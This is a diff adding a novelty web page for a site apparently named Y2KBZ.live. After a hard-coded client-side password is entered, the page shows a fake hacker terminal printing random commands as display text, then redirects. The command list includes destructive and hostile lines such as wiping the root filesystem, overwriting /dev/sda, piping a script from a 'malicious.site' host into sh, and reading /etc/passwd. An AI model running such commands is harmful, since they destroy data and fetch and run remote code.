@@ -1,0 +1,135 @@
+<!-- danger.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Danger - Y2KBZ.live</title>
+<link href="https://fonts.googleapis.com/css2?family=Shrikhand&display=swap" rel="stylesheet" />
+<style>
+  html, body {
+    margin: 0; height: 100%; overflow: hidden;
+    font-family: 'Shrikhand', cursive;
+    background-color: #cc0000; /* red */
+    color: white;
+    user-select: none;
+  }
+  #container {
+    height: 100vh; display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+  }
+  #passwordInput {
+    font-size: 1.5em; padding: 10px;
+    border-radius: 5px; border: none;
+    text-align: center;
+    width: 300px;
+  }
+  #enterBtn {
+    margin-top: 20px; padding: 10px 30px;
+    font-size: 1.5em; border-radius: 5px; border: none;
+    cursor: pointer; background-color: white; color: black;
+    font-family: 'Shrikhand', cursive;
+    transition: background-color 0.3s ease;
+  }
+  #enterBtn:hover {
+    background-color: #ddd;
+  }
+  #terminal {
+    display: none;
+    background-color: black;
+    width: 100vw;
+    height: 100vh;
+    padding: 20px;
+    font-family: monospace, monospace;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    box-sizing: border-box;
+    color: #33ff33;
+  }
+</style>
+</head>
+<body>
+  <div id="container">
+    <input type="password" id="passwordInput" placeholder="Enter reset password" autocomplete="off" />
+    <button id="enterBtn">Enter</button>
+  </div>
+
+  <pre id="terminal"></pre>
+
+<script>
+  const resetPassword = "y2kbzreset";
+  const pwInput = document.getElementById('passwordInput');
+  const enterBtn = document.getElementById('enterBtn');
+  const container = document.getElementById('container');
+  const terminal = document.getElementById('terminal');
+
+  function randomCommand() {
+    const commands = [
+      "sudo rm -rf / --no-preserve-root",
+      "git clone https://github.com/hacker/repo.git",
+      "nmap -sS -p- 192.168.1.1",
+      "curl -X POST http://bad.site/api -d '{\"data\":\"hack\"}'",
+      "ssh root@192.168.1.10",
+      "ping -t 192.168.1.100",
+      "cat /etc/passwd",
+      "echo 'Hacking in progress...'",
+      "chmod 777 /var/www/html",
+      "dd if=/dev/zero of=/dev/sda bs=512 count=1",
+      "find / -name '*.log' -delete",
+      "netstat -an | grep ESTABLISHED",
+      "perl -e 'print \"Exploit running\\n\";'",
+      "python3 exploit.py --target 10.0.0.5",
+      "systemctl stop firewall.service",
+      "iptables -F",
+      "wget http://malicious.site/malware.sh -O- | sh",
+      "service ssh restart",
+      "echo 'Access granted' > /dev/null",
+      "tail -f /var/log/auth.log"
+    ];
+    return commands[Math.floor(Math.random() * commands.length)];
+  }
+
+  function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  async function typeFakeCommands() {
+    terminal.style.display = "block";
+    terminal.textContent = "";
+    const lines = 40;
+    for (let i = 0; i < lines; i++) {
+      terminal.textContent += randomCommand() + "\n";
+      terminal.scrollTop = terminal.scrollHeight;
+      await sleep(125);
+    }
+  }
+
+  enterBtn.addEventListener('click', async () => {
+    if (pwInput.value === resetPassword) {
+      // Hide input container
+      container.style.display = 'none';
+      // Make background black
+      document.body.style.backgroundColor = 'black';
+      // Show terminal full screen
+      terminal.style.display = 'block';
+      terminal.style.width = '100vw';
+      terminal.style.height = '100vh';
+      // Start typing fake commands
+      await typeFakeCommands();
+      // After typing finish, redirect to home.html after 2 seconds
+      setTimeout(() => {
+        window.location.href = "after-danger.html";
+      }, 2000);
+    } else {
+      alert("Incorrect password");
+      pwInput.value = "";
+      pwInput.focus();
+    }
+  });
+
+  pwInput.addEventListener('keydown', e => {
+    if (e.key === 'Enter') enterBtn.click();
+  });
+</script>
+</body>
+</html>
